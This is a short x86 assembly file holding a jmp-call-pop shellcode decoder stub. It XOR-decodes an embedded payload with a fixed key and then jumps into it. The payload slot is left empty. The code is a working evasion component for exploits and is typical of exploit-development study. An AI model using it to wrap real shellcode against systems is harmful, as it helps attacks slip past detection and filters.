[SECTION .text]
global _start
_start:

jmp payload           ; Jump to instr before payload

; Decoder stub
decoder:
pop esi               ; Get address of encoded payload
mov eax, 0x77777777   ; Set EAX = encryption key
xor ecx, ecx          ; Set ECX = 0 
add cl, 0x77          ; Set ECX = payload length in DWORDS
main_loop:
xor dword [esi], eax  ; Decrypt DWORD at ESI
add esi, 4            ; Advance ESI
loop main_loop        ; Decr ECX and loop if not zero
jmp payload_exec      ; Jump to shellcode

payload:
call decoder          ; Call back to decoder
payload_exec:
; -- ENCODED PAYLOAD HERE --
